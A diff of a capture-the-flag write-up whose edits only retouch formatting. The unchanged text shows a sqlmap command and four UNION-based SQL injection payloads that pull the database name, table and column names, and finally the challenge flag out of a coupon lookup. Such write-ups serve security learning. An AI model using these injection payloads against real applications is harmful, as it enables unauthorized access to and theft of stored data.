@@ -28,7 +28,7 @@ This landing page contained 6 links where 2 of them contained below interesting 
     if (arg !== "undefined") {
       $('#rick-says').append(arg);
     }
-      //console.log(arg)
+    //console.log(arg)
   </script>
 
 </body>
@@ -125,22 +125,22 @@ sqlmap -r ./request.txt -p cid
 The SQLmap tool reported that `UNION attack` with 3 columns is the way to go.
 My first injection was for acquiring the database name: `test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'x`  
 The actual executed query becomes:  
-```SQL
+```sql
 SELECT * FROM coupons WHERE code = 'test' UNION SELECT DATABASE(), DATABASE(), DATABASE() WHERE 'x' = 'x'
 ```
 Received the database name as `ff86e476b1344851f095759d1eeccda72d9363ad`. The second injection was to list all tables in this database: `test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'x`  
 The correctly executed query becomes:  
-```SQL
+```sql
 SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, table_name, table_type FROM information_schema.tables WHERE 'x' = 'x'
 ```
 Revealed table names were `c2VjcmV0LWRi` and `coupons`. The third injection was to get column names of the `c2VjcmV0LWRi` table: `test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi`   
 The correctly executed query becomes:  
-```SQL
+```sql
 SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, column_name, column_name FROM information_schema.columns WHERE table_schema  = 'ff86e476b1344851f095759d1eeccda72d9363ad' AND table_name = 'c2VjcmV0LWRi'
 ```
 Revealed only one column named `ZGVmaW5pdGVseS1ub3QtZmxhZw`. The fourth injection explored the data of the `c2VjcmV0LWRi` table: `test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'x`  
 The correctly executed query becomes:  
-```SQL
+```sql
 SELECT * FROM coupons WHERE code = 'test' UNION SELECT NULL, ZGVmaW5pdGVseS1ub3QtZmxhZw, ZGVmaW5pdGVseS1ub3QtZmxhZw FROM c2VjcmV0LWRi WHERE 'x' = 'x'
 ```
 The flag `BtS-CTF{7h475_h0w_y0u_ch347_1n_94m35}` was only thing in table `c2VjcmV0LWRi`.
